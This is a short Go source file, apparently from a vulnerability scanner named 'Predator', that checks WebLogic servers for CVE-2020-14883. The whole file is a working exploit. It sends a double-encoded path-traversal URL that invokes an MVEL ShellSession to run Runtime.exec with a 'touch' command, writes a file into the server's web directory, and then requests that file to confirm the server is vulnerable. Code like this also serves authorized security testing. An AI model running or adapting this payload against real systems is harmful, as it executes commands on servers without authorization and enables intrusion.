package weblogic

import (
	"Predator/pkg/utils"
)

func CVE_2020_14883(url string) bool {
	if _, err := utils.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)", "GET", "", false, nil); err == nil {
		if req2, err2 := utils.HttpRequset(url+"/console/framework/skins/wlsconsole/css/test.txt", "GET", "", false, nil); err2 == nil {
			if req2.StatusCode == 200 {
				return true
			}
		}
	}
	return false
}
